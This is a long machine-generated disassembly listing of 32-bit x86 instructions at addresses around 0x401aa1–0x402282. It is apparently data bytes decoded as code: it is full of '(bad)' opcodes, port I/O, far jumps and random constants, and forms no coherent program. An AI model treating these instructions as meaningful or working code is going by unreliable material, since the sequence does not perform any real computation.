  401aa1:	add    eax,0x113ae3ab
  401aa6:	pop    eax
  401aa7:	dec    esi
  401aa8:	xchg   DWORD PTR [edx],eax
  401aaa:	mov    cl,0x19
  401aac:	outs   dx,DWORD PTR ds:[esi]
  401aad:	mov    edi,0x5d66eaa9
  401ab2:	fcomp  QWORD PTR [edi-0xd1f1ba]
  401ab8:	test   DWORD PTR [edi+0x7c],esp
  401abb:	repz stc 
  401abd:	cld    
  401abe:	mov    dh,ch
  401ac0:	popf   
  401ac1:	pusha  
  401ac2:	add    BYTE PTR [ebx+0x1df90c7e],bl
  401ac8:	cdq    
  401ac9:	(bad)  
  401aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401acb:	ins    BYTE PTR es:[edi],dx
  401acc:	jne    0x401a9f
  401ace:	add    dl,bl
  401ad0:	lahf   
  401ad1:	aad    0x6e
  401ad3:	adc    al,0xf5
  401ad5:	pop    edx
  401ad6:	sbb    edx,DWORD PTR [ebx+0x5b33e630]
  401adc:	in     al,0xce
  401ade:	out    dx,al
  401adf:	mov    ebp,0x51dd010
  401ae4:	add    BYTE PTR [ebx],ah
  401ae6:	inc    ebp
  401ae7:	fnstcw WORD PTR [ebx-0x27]
  401aea:	jns    0x401ac3
  401aec:	cmp    edi,DWORD PTR [ebp+ebx*2+0x4a2096cb]
  401af3:	sbb    ebx,DWORD PTR [esi+eax*1-0xc1a0d09]
  401afa:	cmc    
  401afb:	dec    edi
  401afc:	(bad)  
  401afe:	(bad)  
  401aff:	je     0x401aa2
  401b01:	xlat   BYTE PTR ds:[ebx]
  401b02:	xchg   esp,eax
  401b03:	clc    
  401b04:	and    edx,DWORD PTR [ebx+0x76]
  401b07:	lods   eax,DWORD PTR ds:[esi]
  401b08:	into   
  401b09:	mul    BYTE PTR [ecx]
  401b0b:	aas    
  401b0c:	dec    ebp
  401b0d:	add    dh,bh
  401b0f:	je     0x401afa
  401b11:	cmp    dh,0xa4
  401b14:	dec    ecx
  401b15:	loopne 0x401b76
  401b17:	lahf   
  401b18:	push   0xffffffc2
  401b1a:	dec    ebp
  401b1b:	cdq    
  401b1c:	jbe    0x401b2e
  401b1e:	dec    edx
  401b1f:	adc    eax,0x70ed3f90
  401b24:	scas   al,BYTE PTR es:[edi]
  401b25:	dec    esi
  401b26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b27:	mov    cl,0xbe
  401b29:	(bad)  
  401b2a:	fld    DWORD PTR [ebx+0x42ded624]
  401b30:	fcomp  QWORD PTR [edx-0x2d]
  401b33:	jl     0x401ae9
  401b35:	jo     0x401bb2
  401b37:	popf   
  401b38:	repz sub ecx,DWORD PTR [eax-0x76c50882]
  401b3f:	test   eax,0xe9946788
  401b44:	leave  
  401b45:	sar    bl,0x83
  401b48:	push   0xe
  401b4a:	cmp    eax,0xb4153159
  401b4f:	cwde   
  401b50:	push   ebp
  401b51:	aad    0xb8
  401b53:	xor    eax,0xcd9156c6
  401b58:	mov    BYTE PTR [esi+ebp*8],cl
  401b5b:	out    dx,eax
  401b5c:	sbb    al,BYTE PTR [ebp+0x6f]
  401b5f:	fs ror ebx,0x1a
  401b63:	adc    ch,BYTE PTR [ecx+0x49782718]
  401b69:	add    cl,bh
  401b6b:	into   
  401b6c:	pushf  
  401b6d:	fimul  DWORD PTR [ebx+0x34]
  401b70:	xchg   edi,eax
  401b71:	popa   
  401b72:	stos   BYTE PTR es:[edi],al
  401b73:	add    BYTE PTR [eax],ah
  401b75:	inc    ebp
  401b76:	adc    DWORD PTR [edx+eax*2+0x60],0xcf88e91b
  401b7e:	xchg   edx,eax
  401b7f:	ja     0x401b6f
  401b81:	mov    WORD PTR [ebp+0x1f],?
  401b84:	lods   al,BYTE PTR ds:[esi]
  401b85:	xchg   edi,eax
  401b86:	mov    esp,0x6c55c61b
  401b8b:	dec    edx
  401b8c:	cmp    al,0x19
  401b8e:	into   
  401b8f:	imul   eax,DWORD PTR [ecx+ebp*1],0xf862176e
  401b96:	sahf   
  401b97:	push   edi
  401b98:	lods   al,BYTE PTR ds:[esi]
  401b99:	push   esp
  401b9a:	popa   
  401b9b:	jno    0x401bdf
  401b9d:	fisubr DWORD PTR [edx-0x28]
  401ba0:	inc    edx
  401ba1:	jmp    0x401b52
  401ba3:	mov    ds:0x3a68fa79,al
  401ba8:	mov    ecx,0x94e4402d
  401bad:	mov    ebx,DWORD PTR [ebp-0x33e1543c]
  401bb3:	mov    al,ds:0x844f6111
  401bb8:	mov    eax,ds:0xcfa00a7e
  401bbd:	inc    eax
  401bbe:	cmp    al,0x69
  401bc0:	fcomp  QWORD PTR [esi-0x49]
  401bc3:	fnstenv [edi-0xd9abcc1]
  401bc9:	out    0x50,eax
  401bcb:	pop    ebp
  401bcc:	sbb    edi,DWORD PTR [esi-0x27d681c]
  401bd2:	push   es
  401bd3:	mov    al,ds:0x2a05cbe1
  401bd8:	dec    ebx
  401bd9:	in     al,0xe1
  401bdb:	ret    
  401bdc:	adc    DWORD PTR [edi-0x34],esi
  401bdf:	ja     0x401bdc
  401be1:	cmp    DWORD PTR [esi+ecx*2],esi
  401be4:	dec    esi
  401be5:	stos   BYTE PTR es:[edi],al
  401be6:	out    dx,al
  401be7:	or     eax,0x5af75477
  401bec:	xlat   BYTE PTR ds:[ebx]
  401bed:	adc    BYTE PTR [ecx+0x5c],bl
  401bf0:	fstp   TBYTE PTR [esp+eiz*8+0x629f5d08]
  401bf7:	mov    esp,0xdb1d79ad
  401bfc:	ret    0x79a2
  401bff:	shl    DWORD PTR [edx],cl
  401c01:	push   ebx
  401c02:	xor    dl,bl
  401c04:	out    0xc4,al
  401c06:	xor    al,0xa9
  401c08:	les    esp,FWORD PTR [edx-0x6e9d551a]
  401c0e:	xor    eax,0x6a4d6d3c
  401c13:	pop    ebx
  401c14:	or     al,dl
  401c16:	fcomip st,st(0)
  401c18:	sbb    BYTE PTR [esi],ch
  401c1a:	loope  0x401bc0
  401c1c:	repz out 0xe4,eax
  401c1f:	fcomp  QWORD PTR [esi-0x10009257]
  401c25:	inc    ebp
  401c26:	mov    ds:0x9258973,al
  401c2b:	ins    BYTE PTR es:[edi],dx
  401c2c:	cwde   
  401c2d:	into   
  401c2e:	xor    al,0xd2
  401c30:	cdq    
  401c31:	in     eax,dx
  401c32:	dec    esi
  401c33:	pop    esp
  401c34:	popf   
  401c35:	pop    edi
  401c36:	cmp    esp,DWORD PTR [eax+0x20ca9e1d]
  401c3c:	(bad)  
  401c3e:	or     eax,0x8700733b
  401c43:	mov    ebp,0x459deb71
  401c48:	add    eax,0x525f8ae3
  401c4d:	mov    al,0xdc
  401c4f:	mov    dh,0xa9
  401c51:	or     bh,BYTE PTR [esi]
  401c53:	fnsave [ebx+0x792083bd]
  401c59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c5a:	add    BYTE PTR [ecx-0x12],cl
  401c5d:	jne    0x401be9
  401c5f:	push   0x234f0f98
  401c64:	pop    edi
  401c65:	fcmovnb st,st(4)
  401c67:	popa   
  401c68:	call   0x5b47:0x6d345833
  401c6f:	lea    ecx,[edi-0x6e58ffc3]
  401c75:	xchg   esp,eax
  401c76:	push   edi
  401c77:	mov    bh,0xfd
  401c79:	dec    esi
  401c7a:	cmc    
  401c7b:	aad    0xce
  401c7d:	or     BYTE PTR [ecx-0x75ab5418],bh
  401c83:	arpl   WORD PTR [edx+0x274703ed],ax
  401c89:	cmp    eax,edi
  401c8b:	clc    
  401c8c:	xor    DWORD PTR [ecx-0x69],edi
  401c8f:	adc    edx,DWORD PTR [esi+0x4822a003]
  401c95:	repz pop ecx
  401c97:	daa    
  401c98:	mov    bl,0x3
  401c9a:	and    al,0xce
  401c9c:	or     ecx,DWORD PTR [ecx+ebp*1]
  401c9f:	pop    ecx
  401ca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ca1:	add    eax,0xfa16746a
  401ca6:	sub    eax,0x1ccc1131
  401cab:	ds mov eax,0xa47a2792
  401cb1:	xchg   BYTE PTR [edx],dl
  401cb3:	iret   
  401cb4:	mov    ah,0xe1
  401cb6:	in     al,0xa7
  401cb8:	xchg   esi,eax
  401cb9:	outs   dx,DWORD PTR ds:[esi]
  401cba:	and    edx,DWORD PTR [edx-0x37]
  401cbd:	sbb    DWORD PTR cs:[bx+di-0x4a],0x2106dcab
  401cc6:	out    dx,eax
  401cc7:	es pop ds
  401cc9:	cmc    
  401cca:	popf   
  401ccb:	int    0xab
  401ccd:	push   0x3a
  401ccf:	xlat   BYTE PTR ds:[ebx]
  401cd0:	cld    
  401cd1:	xchg   edx,eax
  401cd2:	jl     0x401d21
  401cd4:	sbb    BYTE PTR [eax+0x37],0x2b
  401cd8:	pop    esp
  401cd9:	jp     0x401c78
  401cdb:	loop   0x401c99
  401cdd:	jmp    0xb9b61a84
  401ce2:	push   0xffffffeb
  401ce4:	jp     0x401cb5
  401ce6:	push   esp
  401ce7:	retf   
  401ce8:	jmp    0x401d46
  401cea:	and    DWORD PTR [edx+0x3d],eax
  401ced:	cdq    
  401cee:	ror    dh,1
  401cf0:	sub    ecx,DWORD PTR [ebp+ebx*2-0x685e4886]
  401cf7:	jmp    0x64e3c9cb
  401cfc:	in     eax,dx
  401cfd:	in     al,dx
  401cfe:	inc    esp
  401cff:	mov    bh,0x4b
  401d01:	stos   DWORD PTR es:[edi],eax
  401d02:	sub    bh,bl
  401d04:	std    
  401d05:	sbb    esp,DWORD PTR [edx+esi*2+0x1c]
  401d09:	xor    edi,DWORD PTR [ecx+edi*4]
  401d0c:	fadd   st,st(1)
  401d0e:	out    dx,eax
  401d0f:	push   ss
  401d10:	ins    DWORD PTR es:[edi],dx
  401d11:	add    eax,0xd0941cb8
  401d16:	pop    edi
  401d17:	iret   
  401d18:	js     0x401c9b
  401d1a:	scas   al,BYTE PTR es:[edi]
  401d1b:	ret    0x7f9
  401d1e:	ja     0x401d79
  401d20:	jg     0x401d00
  401d22:	pusha  
  401d23:	mov    eax,ds:0x7da6b0cf
  401d28:	push   0xd0340e2a
  401d2d:	sub    ebp,DWORD PTR [edx-0x36]
  401d30:	ret    
  401d31:	(bad)  
  401d32:	js     0x401cda
  401d34:	mov    BYTE PTR [edx],ah
  401d36:	(bad)  
  401d37:	aaa    
  401d38:	ins    BYTE PTR es:[edi],dx
  401d39:	repz or BYTE PTR [ebx-0x8064c1b],bl
  401d40:	test   eax,0x436797d3
  401d45:	jecxz  0x401dbb
  401d47:	prefetch BYTE PTR [ecx]
  401d4a:	add    al,0xc0
  401d4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d4d:	stos   DWORD PTR es:[edi],eax
  401d4e:	in     al,dx
  401d4f:	mov    ecx,0x13118a9f
  401d54:	clc    
  401d55:	cwde   
  401d56:	into   
  401d57:	jmp    0xb20:0x19962b62
  401d5e:	sub    BYTE PTR [edi],bl
  401d60:	xchg   edi,eax
  401d61:	arpl   WORD PTR [edx],si
  401d63:	jmp    0x7f1b58f2
  401d68:	sti    
  401d69:	imul   edi,DWORD PTR [ebx-0x5ad8f06],0x56
  401d70:	pusha  
  401d71:	sbb    eax,0x24053e66
  401d76:	mov    es,WORD PTR [edi-0x42]
  401d79:	outs   dx,DWORD PTR ds:[esi]
  401d7a:	inc    esi
  401d7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d7c:	je     0x401dc8
  401d7e:	jmp    0xc999:0x38eb4f42
  401d85:	mov    eax,DWORD PTR [edi-0x486e7e0e]
  401d8b:	sub    eax,0xd163e85a
  401d90:	xchg   BYTE PTR ds:0x61962be4,ah
  401d96:	mov    ebx,0x7d036cb9
  401d9b:	outs   dx,DWORD PTR ds:[esi]
  401d9c:	aam    0x5c
  401d9e:	and    ecx,DWORD PTR [ecx]
  401da0:	icebp  
  401da1:	cdq    
  401da2:	lods   al,BYTE PTR ds:[esi]
  401da3:	es sti 
  401da5:	aas    
  401da6:	xor    DWORD PTR [edx+esi*8],edx
  401da9:	popa   
  401daa:	adc    BYTE PTR [edx+esi*1-0x41412fc],al
  401db1:	hlt    
  401db2:	mov    cl,0x9a
  401db4:	add    DWORD PTR [edx],esp
  401db6:	out    0xf3,eax
  401db8:	sbb    al,0xfd
  401dba:	fld    st(2)
  401dbc:	out    dx,al
  401dbd:	shl    BYTE PTR [ecx],cl
  401dbf:	addr16 in eax,dx
  401dc1:	fist   DWORD PTR [edx]
  401dc3:	stos   DWORD PTR es:[edi],eax
  401dc4:	ror    BYTE PTR [edx+esi*4-0x52],cl
  401dc8:	jbe    0x401ded
  401dca:	add    al,0xfa
  401dcc:	in     eax,0x52
  401dce:	outs   dx,DWORD PTR ds:[esi]
  401dcf:	fist   WORD PTR [edx+eiz*1-0x1de80aae]
  401dd6:	adc    eax,0x3dbe8a5c
  401ddb:	push   esp
  401ddc:	sqrtps xmm1,xmm0
  401ddf:	dec    esi
  401de0:	mov    DWORD PTR [ecx-0x6d],edi
  401de3:	mov    ds:0xcb89a445,al
  401de8:	(bad)  
  401de9:	mov    WORD PTR [esi+0x7e],ds
  401dec:	inc    esp
  401ded:	inc    esp
  401dee:	push   0xfe83d066
  401df3:	mov    bl,BYTE PTR [ebp-0x6c5ad606]
  401df9:	popf   
  401dfa:	cmp    al,0xba
  401dfc:	adc    BYTE PTR [eax+0x1c],al
  401dff:	nop
  401e00:	push   0x7c
  401e02:	mov    WORD PTR [edx],?
  401e04:	jle    0x401dbb
  401e06:	fs fs sub dl,bh
  401e0a:	fwait
  401e0b:	jmp    0xd8d8:0x1d1caed7
  401e12:	lods   al,BYTE PTR ds:[esi]
  401e13:	pop    esi
  401e14:	pop    ss
  401e15:	add    esi,DWORD PTR [esi+0x2d]
  401e18:	out    0xb,al
  401e1a:	mov    ah,al
  401e1c:	nop
  401e1d:	pusha  
  401e1e:	lahf   
  401e1f:	into   
  401e20:	imul   ecx,DWORD PTR es:[ebx-0xa385a90],0xffffffca
  401e28:	xor    bh,al
  401e2a:	rcl    DWORD PTR [ebp-0x4c6d2e87],cl
  401e30:	cmp    BYTE PTR [edx+0x1f],0xcb
  401e34:	dec    DWORD PTR [edx+0x2e]
  401e37:	sub    al,BYTE PTR [edi-0x3a]
  401e3a:	jo     0x401e3c
  401e3c:	mov    ebp,0x4b30048a
  401e41:	fdiv   QWORD PTR [ebx+0x19]
  401e44:	cwde   
  401e45:	std    
  401e46:	jg     0x401e07
  401e48:	jb     0x401e29
  401e4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e4b:	add    al,0x68
  401e4d:	mov    esp,0x4201f627
  401e52:	inc    edi
  401e53:	(bad)  
  401e54:	mov    bl,0x59
  401e56:	ret    0xe35a
  401e59:	xor    eax,0xa6572a4b
  401e5e:	icebp  
  401e5f:	push   0xddd08099
  401e64:	jnp    0x401ebd
  401e66:	lahf   
  401e67:	inc    ebx
  401e68:	aaa    
  401e69:	sub    eax,0xe49a58d9
  401e6e:	bound  ebp,QWORD PTR [esi-0x56]
  401e71:	fist   DWORD PTR ds:0xebed1a01
  401e77:	es or  edi,ebx
  401e7a:	shr    BYTE PTR [eax-0x688457fd],0xf4
  401e81:	xchg   ebp,eax
  401e82:	mov    BYTE PTR ds:0x1437c00f,bl
  401e88:	push   edi
  401e89:	push   ebx
  401e8a:	adc    al,0x5c
  401e8c:	in     al,0xdf
  401e8e:	jns    0x401ef0
  401e90:	mul    DWORD PTR [ebx]
  401e92:	pusha  
  401e93:	aaa    
  401e94:	aaa    
  401e95:	sar    DWORD PTR [ecx-0x17],0x51
  401e99:	cmp    cl,BYTE PTR [eax+eiz*4+0x61]
  401e9d:	push   ebp
  401e9e:	ret    0xdfe
  401ea1:	leave  
  401ea2:	ja     0x401f00
  401ea4:	lods   eax,DWORD PTR ds:[esi]
  401ea5:	cs je  0x401eea
  401ea8:	das    
  401ea9:	mov    edi,0xe864087c
  401eae:	mov    eax,ds:0x55b86674
  401eb3:	fisub  WORD PTR [ecx+0x39]
  401eb6:	retf   
  401eb7:	mov    eax,ds:0x6c9e48c4
  401ebc:	and    bh,ah
  401ebe:	lock popf 
  401ec0:	loope  0x401e63
  401ec2:	ret    0x29b4
  401ec5:	lock xlat BYTE PTR ds:[ebx]
  401ec7:	(bad)  
  401ec8:	pop    ebx
  401ec9:	xchg   ebx,eax
  401eca:	sbb    al,0xaa
  401ecc:	daa    
  401ecd:	mov    bl,0xcc
  401ecf:	push   es
  401ed0:	enter  0xd4af,0x66
  401ed4:	mov    esi,0x1c68f7b3
  401ed9:	popa   
  401eda:	mov    eax,0x18d08123
  401edf:	loope  0x401eef
  401ee1:	push   eax
  401ee2:	sbb    ebx,eax
  401ee4:	inc    eax
  401ee5:	jno    0x401f63
  401ee7:	pop    ebp
  401ee8:	lea    ebp,[edx-0x49]
  401eeb:	outs   dx,DWORD PTR ds:[esi]
  401eec:	rcl    cl,cl
  401eee:	call   0xaf8aa5bb
  401ef3:	adc    BYTE PTR [ecx],0x96
  401ef6:	inc    esi
  401ef7:	aas    
  401ef8:	pop    ss
  401ef9:	inc    ecx
  401efa:	jle    0x401f78
  401efc:	sbb    dl,al
  401efe:	push   ds
  401eff:	mov    eax,0x564b8bac
  401f04:	imul   BYTE PTR [ecx]
  401f06:	jle    0x401f43
  401f08:	bound  edx,QWORD PTR [esi]
  401f0a:	pop    ecx
  401f0b:	fs (bad) 
  401f0d:	jmp    0x401ea1
  401f0f:	fld    DWORD PTR [ebx+0x767270a5]
  401f15:	pop    ecx
  401f16:	xchg   ecx,eax
  401f17:	jnp    0x401efb
  401f19:	rcl    BYTE PTR [ecx-0x4101bc4d],1
  401f1f:	mov    cl,0x16
  401f21:	iret   
  401f22:	lods   eax,DWORD PTR ds:[esi]
  401f23:	add    ebx,DWORD PTR [ecx+0x22a81cb8]
  401f29:	je     0x401eab
  401f2b:	jno    0x401f2c
  401f2d:	jb     0x401fa0
  401f2f:	lea    esi,[esi]
  401f31:	mov    ds:0xa1478927,al
  401f36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f37:	and    bh,BYTE PTR [ebp-0x43]
  401f3a:	mov    bh,0x74
  401f3c:	dec    edx
  401f3d:	sbb    eax,0xbf0bcf64
  401f42:	mov    ecx,0x8f03f5f6
  401f47:	mov    eax,ds:0x3acb900a
  401f4c:	cld    
  401f4d:	inc    ebx
  401f4e:	sahf   
  401f4f:	ret    0x89e2
  401f52:	jl     0x401fce
  401f54:	sub    BYTE PTR [esi+0x3afeead5],bl
  401f5a:	aas    
  401f5b:	pop    ecx
  401f5c:	mov    bh,0x74
  401f5e:	and    DWORD PTR [eax-0x15],ebx
  401f61:	in     eax,0x8d
  401f63:	or     eax,0x3b009699
  401f68:	dec    edi
  401f69:	add    esi,ebx
  401f6b:	jbe    0x401f00
  401f6d:	iret   
  401f6e:	aad    0xe3
  401f70:	out    dx,eax
  401f71:	mov    dl,0xf3
  401f73:	fwait
  401f74:	ret    
  401f75:	fwait
  401f76:	mov    ds:0xf86b9eeb,al
  401f7b:	push   0x8e241997
  401f80:	ss jl  0x401f6e
  401f83:	mov    cl,BYTE PTR [ebp+0x57]
  401f86:	mov    bl,0x1f
  401f88:	fdiv   QWORD PTR [ebp-0x4eab5e76]
  401f8e:	loopne 0x40200a
  401f90:	cld    
  401f91:	fiadd  WORD PTR [eax+edx*1-0x5c2b36b0]
  401f98:	popf   
  401f99:	sub    al,0x3b
  401f9b:	push   ebp
  401f9c:	xor    al,0x22
  401f9e:	inc    ebx
  401f9f:	jmp    0xe194f713
  401fa4:	retf   0x16bd
  401fa7:	test   BYTE PTR [ecx],ah
  401fa9:	ins    BYTE PTR es:[edi],dx
  401faa:	fist   DWORD PTR [edx-0x2b7513d4]
  401fb0:	or     DWORD PTR [edx-0x5426e7bb],edi
  401fb6:	jp     0x401fe6
  401fb8:	scas   eax,DWORD PTR es:[edi]
  401fb9:	cmp    cl,dl
  401fbb:	ret    0x6d57
  401fbe:	popf   
  401fbf:	retf   
  401fc0:	fs or  ah,BYTE PTR fs:[eiz*8+0x45913d78]
  401fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401fca:	mov    ds:0xd17ccb5,al
  401fcf:	aas    
  401fd0:	mov    bl,0xf3
  401fd2:	jo     0x402037
  401fd4:	pop    ds
  401fd5:	(bad)
  401fd8:	push   ebp
  401fd9:	or     edi,DWORD PTR [ebp+ecx*4-0x44]
  401fdd:	xchg   BYTE PTR [eax+ebp*4-0x41bad90b],bh
  401fe4:	addr16 or eax,0x9de7d30d
  401fea:	lods   al,BYTE PTR ds:[esi]
  401feb:	lea    edx,[edx]
  401fed:	sbb    al,0x2e
  401fef:	sbb    al,0x39
  401ff1:	mov    al,ds:0x785465f3
  401ff6:	push   ds
  401ff7:	push   ss
  401ff8:	sbb    BYTE PTR [edi],ah
  401ffa:	int3   
  401ffb:	jo     0x401fac
  401ffd:	test   eax,0x8b24b694
  402002:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402003:	adc    DWORD PTR [ebx],0x311e66b6
  402009:	or     ecx,ecx
  40200b:	xor    eax,0x5d2f6024
  402010:	inc    edx
  402011:	mov    eax,edx
  402013:	ret    0x8ffe
  402016:	mov    ch,0x90
  402018:	stos   BYTE PTR es:[edi],al
  402019:	loop   0x40208e
  40201b:	mov    esp,0xd160db58
  402020:	lods   al,BYTE PTR ds:[esi]
  402021:	sar    dh,1
  402023:	xchg   esi,eax
  402024:	ja     0x40209b
  402026:	scas   al,BYTE PTR es:[edi]
  402027:	(bad)
  40202a:	or     eax,0xe979eec5
  40202f:	pop    ds
  402030:	mov    bl,BYTE PTR [ebp+0x6b8d6ca6]
  402036:	cmp    al,0x2f
  402038:	fadd   st,st(6)
  40203a:	std    
  40203b:	(bad)  
  40203c:	lock mov DWORD PTR [edi+0x6be74699],esi
  402043:	call   0xb647:0xdddda43d
  40204a:	jno    0x402099
  40204c:	and    DWORD PTR [ebp-0x1eb2f91e],0xffffffb6
  402053:	adc    DWORD PTR [edx],esp
  402055:	push   ds
  402056:	adc    DWORD PTR [eax+0x3ef39320],ebx
  40205c:	dec    eax
  40205d:	mov    al,ds:0x8f7705eb
  402062:	add    eax,0x43d05dae
  402067:	jge    0x402080
  402069:	call   0x1725be02
  40206e:	dec    ecx
  40206f:	aam    0x59
  402071:	mov    BYTE PTR [esi+ecx*1],dh
  402074:	sbb    ebp,edi
  402076:	xor    edx,ebp
  402078:	fs push 0x76
  40207b:	pop    ebx
  40207c:	pop    ss
  40207d:	or     BYTE PTR [ecx],bl
  40207f:	out    dx,eax
  402080:	mov    ebp,0x128993b3
  402085:	out    0x24,eax
  402087:	inc    esp
  402088:	mov    edi,0x31d6313a
  40208d:	dec    edi
  40208e:	ret    
  40208f:	ins    BYTE PTR es:[edi],dx
  402090:	sbb    dh,dl
  402092:	lods   eax,DWORD PTR ds:[esi]
  402093:	popf   
  402094:	and    al,0x74
  402096:	sbb    ah,BYTE PTR [edx-0x783facb7]
  40209c:	jne    0x40201e
  40209e:	retf   0xf03b
  4020a1:	lds    ebx,FWORD PTR [eax]
  4020a3:	imul   ebp,ebx,0xfffffff7
  4020a6:	and    eax,0xcb37d30d
  4020ab:	sub    eax,0x80908a00
  4020b0:	repz fadd DWORD PTR [esi]
  4020b3:	fs (bad) 
  4020b5:	jmp    0xe1565192
  4020ba:	jmp    0x402056
  4020bc:	sbb    BYTE PTR [ecx+0x4f],0xf7
  4020c0:	shr    BYTE PTR [ebx-0x54],0xf2
  4020c4:	sbb    dl,dh
  4020c6:	adc    BYTE PTR [ebx-0x72],al
  4020c9:	repnz sub eax,0x4198b474
  4020cf:	cdq    
  4020d0:	stos   DWORD PTR es:[edi],eax
  4020d1:	inc    ebp
  4020d2:	pop    eax
  4020d3:	mov    ds:0xc147e002,al
  4020d8:	dec    ebp
  4020d9:	mov    ebx,0x273b04b4
  4020de:	jmp    0xd988:0x8576c4ef
  4020e5:	ja     0x40211d
  4020e7:	scas   al,BYTE PTR es:[edi]
  4020e8:	mov    bh,0x6c
  4020ea:	xor    DWORD PTR [esi-0x5b2e7e9b],ebx
  4020f0:	sbb    DWORD PTR [edi+0x4f],esp
  4020f3:	xchg   bh,al
  4020f5:	add    al,0x89
  4020f7:	xchg   edx,eax
  4020f9:	cmp    ah,BYTE PTR [edi+edi*4]
  4020fc:	pop    ss
  4020fd:	pusha  
  4020fe:	es pop esp
  402100:	xchg   esi,eax
  402101:	mov    edi,0xe8801db6
  402106:	outs   dx,BYTE PTR ds:[esi]
  402107:	je     0x4020cf
  402109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40210a:	xlat   BYTE PTR ds:[ebx]
  40210b:	push   ds
  40210c:	sbb    edi,ecx
  40210e:	jbe    0x402103
  402110:	ins    DWORD PTR es:[edi],dx
  402111:	and    dl,BYTE PTR [ebp+0x58]
  402114:	or     dh,bh
  402116:	cmp    ch,0xed
  402119:	or     cl,BYTE PTR [ebp-0x30]
  40211c:	xabort 0xe
  40211f:	int3   
  402120:	xchg   esi,eax
  402121:	cmp    DWORD PTR [ecx-0x6d],0x9955a366
  402128:	mov    esp,0x5780b5a
  40212d:	jle    0x402108
  40212f:	iret   
  402130:	lds    ebp,FWORD PTR [ebx+0x1c]
  402133:	or     DWORD PTR [ebp+0x7d210c2c],ebx
  402139:	(bad)  
  40213a:	fstp   QWORD PTR [eax]
  40213c:	retf   
  40213d:	add    bl,BYTE PTR [ebx+0x200ef7ff]
  402143:	out    0x14,al
  402145:	or     eax,0xbf62b2d4
  40214a:	push   ebp
  40214b:	push   edi
  40214c:	mov    edi,0xecbad5d7
  402151:	in     eax,0x96
  402153:	imul   ecx,DWORD PTR ds:0x11be77ee,0x25
  40215a:	pop    esi
  40215b:	jnp    0x402116
  40215d:	sbb    eax,0x4fd58d93
  402162:	jge    0x4021c6
  402164:	pop    ebp
  402165:	xor    ch,ah
  402167:	jmp    0x402128
  402169:	out    0x0,eax
  40216b:	adc    eax,0xeadab5b8
  402170:	or     BYTE PTR [esi],bl
  402172:	xchg   ecx,eax
  402173:	gs push es
  402175:	repz pop es
  402177:	mov    esi,DWORD PTR [esi]
  402179:	aas    
  40217a:	idiv   DWORD PTR [edx-0x58f44a33]
  402180:	pop    esi
  402181:	or     al,0xae
  402183:	or     al,0xf5
  402185:	loop   0x4021dc
  402187:	jns    0x402204
  402189:	adc    bl,BYTE PTR [esi-0xf296f08]
  40218f:	or     dh,0xcc
  402192:	and    eax,0x491dd826
  402197:	mov    ebx,0x4dc2d1af
  40219c:	stc    
  40219d:	and    esi,DWORD PTR [ecx]
  40219f:	jae    0x4021ba
  4021a1:	mov    esp,edx
  4021a3:	or     edx,DWORD PTR [ecx+0x5045f7f9]
  4021a9:	push   es
  4021aa:	divps  xmm2,XMMWORD PTR [eax]
  4021ad:	ja     0x402224
  4021af:	in     eax,dx
  4021b0:	sbb    al,0x6a
  4021b2:	add    BYTE PTR [eax],dl
  4021b4:	call   DWORD PTR [ebp-0x22]
  4021b7:	fcom   QWORD PTR [ecx]
  4021b9:	pop    es
  4021ba:	mov    edx,0x9463cb72
  4021bf:	(bad)
  4021c2:	cmp    al,0x3d
  4021c4:	mov    al,0xea
  4021c6:	jl     0x402214
  4021c8:	fsub   st,st(7)
  4021ca:	fcomi  st,st(6)
  4021cc:	sub    eax,0xd7af54d6
  4021d1:	call   0x52e4:0x99d333e1
  4021d8:	fnstsw WORD PTR [eax-0x29]
  4021db:	cs add dh,cl
  4021de:	repnz mov edx,0x8457fcd2
  4021e4:	test   al,0x51
  4021e6:	mov    ds:0xc03f8126,eax
  4021eb:	mov    ds:0x7d0673be,al
  4021f0:	in     al,0x5
  4021f2:	mov    al,0xca
  4021f4:	xchg   esi,eax
  4021f5:	scas   eax,DWORD PTR es:[edi]
  4021f6:	fs call 0x1f308a0a
  4021fc:	and    edi,DWORD PTR [ebp-0x58]
  4021ff:	test   BYTE PTR [edi+0x1b52fbf2],dl
  402205:	sub    ch,cl
  402207:	jbe    0x402245
  402209:	push   ecx
  40220a:	call   0xf1518c9b
  40220f:	out    dx,al
  402210:	sub    DWORD PTR [ebx+0x49258895],ecx
  402216:	das    
  402217:	repnz and al,0xd7
  40221a:	xor    ecx,esi
  40221c:	push   eax
  40221d:	enter  0xbd5d,0xf9
  402221:	addr16 jmp 0x4021cb
  402224:	push   edi
  402225:	cmp    BYTE PTR [eax-0xe],cl
  402228:	and    dl,bl
  40222a:	push   ebp
  40222b:	dec    ecx
  40222c:	mov    al,ds:0x6a863006
  402231:	lods   eax,DWORD PTR ds:[esi]
  402232:	sub    BYTE PTR [esi+0x5a],al
  402235:	jl     0x402269
  402237:	stc    
  402238:	scas   al,BYTE PTR es:[edi]
  402239:	add    al,al
  40223b:	inc    edx
  40223c:	xor    DWORD PTR [eax],ebx
  40223e:	js     0x402209
  402240:	enter  0xbac0,0xe
  402244:	push   cs
  402245:	stos   DWORD PTR es:[edi],eax
  402246:	mov    ds:0x4f1b3e75,eax
  40224b:	mov    ah,0x30
  40224d:	sub    DWORD PTR [ecx+0x74],edi
  402250:	pushf  
  402251:	sbb    eax,DWORD PTR [ebp-0x6e80a28d]
  402257:	arpl   WORD PTR [ebp-0x55],di
  40225a:	cmp    esi,edx
  40225c:	jecxz  0x40229f
  40225e:	cmp    al,0x97
  402260:	xor    ebp,DWORD PTR [ebp-0x62c7e6ca]
  402266:	loopne 0x402217
  402268:	ss daa 
  40226a:	mov    esp,0xc868ecb2
  40226f:	mov    edi,DWORD PTR [esi-0x7d164c]
  402275:	(bad)  
  402276:	jl     0x402200
  402278:	in     eax,dx
  402279:	(bad)  
  40227b:	mov    al,ds:0x8c8c30e8
  402280:	push   0x4a
  402282:	addr16 pop esi
